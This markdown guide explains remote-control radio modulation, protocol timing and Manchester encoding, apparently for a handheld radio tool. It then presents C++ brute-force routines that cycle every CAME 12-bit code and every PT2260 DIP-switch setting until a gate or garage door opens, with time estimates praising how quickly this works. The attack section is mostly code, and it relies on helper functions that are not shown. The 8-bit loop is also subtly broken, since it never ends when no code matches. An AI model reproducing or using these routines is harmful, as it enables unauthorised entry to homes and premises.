## Modulation Types Explained

### ASK (Amplitude Shift Keying)

- Varies signal **amplitude** (strength)
- Binary: Strong signal = 1, Weak signal = 0
- **Most common** for car keys and garage doors
- Easy to implement, low power

### OOK (On-Off Keying)

- Special case of ASK: **On** = 1, **Off** = 0
- Simplest modulation possible
- Very common in cheap remotes
- Same as ASK but more extreme (0% vs 100% amplitude)

### FSK (Frequency Shift Keying)

- Varies signal **frequency**
- Binary: Frequency A = 0, Frequency B = 1
- More robust than ASK/OOK
- Used in some modern protocols

## Symbol Duration (TE) Guide

**TE (Time Element)** is the duration of one symbol in the protocol.

| TE Range  | Protocol Examples   | Notes                 |
| --------- | ------------------- | --------------------- |
| 180-220μs | Chamberlain, Linear | Fast protocols        |
| 280-320μs | CAME, PT2260        | Medium speed          |
| 400-450μs | Holtek HT12X AM     | Slower, more robust   |
| 650-750μs | NICE                | Very slow, long range |

**Why TE Matters**:

- Helps identify protocol even without full decode
- Determines transmission speed (fast TE = faster transmission)
- Affects range (slower TE = longer range, more robust)

## Manchester Encoding

Many protocols use **Manchester encoding**:

- Each bit is split into 2 symbols
- Bit 0: Low-High transition (01)
- Bit 1: High-Low transition (10)
- Self-clocking (doesn't need separate clock signal)

**Example**:

```
Data:   1   0   1   1   0
        ↓   ↓   ↓   ↓   ↓
Encoded: 10 01 10 10 01
```

## Brute-Force Strategy

### Full Brute-Force (CAME 12bit)

```cpp
void brute_force_came_12bit() {
    uint16_t max_value = (1 << 12) - 1;  // 2^12 - 1 = 4095

    for (uint16_t code = 0; code <= max_value; code++) {
        // Transmit code
        transmit_came_code(code);

        // Wait for response (gate opens, LED lights up, etc.)
        delay(CAME_TX_TIMEOUT);  // ~6ms between transmissions

        // Check for success
        if (target_responded()) {
            printf("🦈 Code found: 0x%03X (%d)\n", code, code);
            break;
        }

        // Progress update every 100 codes
        if (code % 100 == 0) {
            float progress = (code * 100.0) / max_value;
            printf("Progress: %.1f%% (%d/%d)\n", progress, code, max_value);
        }
    }
}
```

**Time Estimate**:

- 4096 codes × 6ms per code = ~24 seconds total
- With repeats (3×): ~72 seconds
- **Very feasible!**

### DIP Switch Brute-Force (PT2260/PT2262)

```cpp
void brute_force_pt2260_dip() {
    // Only 256 combinations (8 DIP switches)
    uint8_t max_value = (1 << 8) - 1;  // 255

    for (uint8_t dip_code = 0; dip_code <= max_value; dip_code++) {
        // Convert 8-bit DIP code to 24-bit protocol format
        uint32_t full_code = expand_dip_to_24bit(dip_code);

        // Transmit
        transmit_pt2260_code(full_code);
        delay(PT2260_TX_TIMEOUT);

        if (target_responded()) {
            printf("🦈 DIP code found: 0x%02X (switches: %s)\n",
                dip_code, format_dip_switches(dip_code));
            break;
        }
    }
}
```

**Time Estimate**:

- 256 combinations × 10ms = 2.56 seconds
- **Extremely fast!**
